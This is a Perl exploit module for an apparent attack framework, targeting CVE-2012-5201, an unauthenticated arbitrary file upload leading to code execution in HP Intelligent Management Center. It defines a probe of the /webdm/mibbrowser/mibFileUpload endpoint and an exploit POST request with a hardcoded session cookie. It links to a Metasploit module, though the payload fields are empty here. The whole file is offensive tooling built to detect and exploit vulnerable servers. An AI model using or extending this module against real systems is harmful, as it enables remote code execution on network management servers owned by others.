package HP::MSF::HpImcMibfileupload;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "HpImcMibfileupload";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/webdm/mibbrowser/mibFileUpload',
  PAYLOAD => '',
  TEXT => 'Checking If : /webdm/mibbrowser/mibFileUpload Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  CVE => "CVE-2012-5201",
  DESCRIPTION => "

          This module exploits a code execution flaw in HP Intelligent Management Center.

        The vulnerability exists in the mibFileUpload which is accepting unauthenticated

        file uploads and handling zip contents in an insecure way. Combining both weaknesses

        a remote attacker can accomplish arbitrary file upload. This module has been tested

        successfully on HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2.

      ",
  METHOD => "POST",
  MSF_MODULE => "hp_imc_mibfileupload",
  OSVDB => 91026,
  PATHS => ["imc"],
  REFERENCES => [
    "https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03689276",
  ],
  TITLE => "HP Intelligent Management Center Arbitrary File Upload",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "Path to HP Intelligent Management Center",
  VALUE => "/imc",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'webdm/mibbrowser/mibFileUpload',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [POST] /webdm/mibbrowser/mibFileUpload',
      HEADERS      => {
        'Cookie' => 'JSESSIONID=19df72548a04891dd5bdae66fd22713a',
        'Content-Type' => 'multipart/form-data; boundary=_Part_944_4212266737_3801233708',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
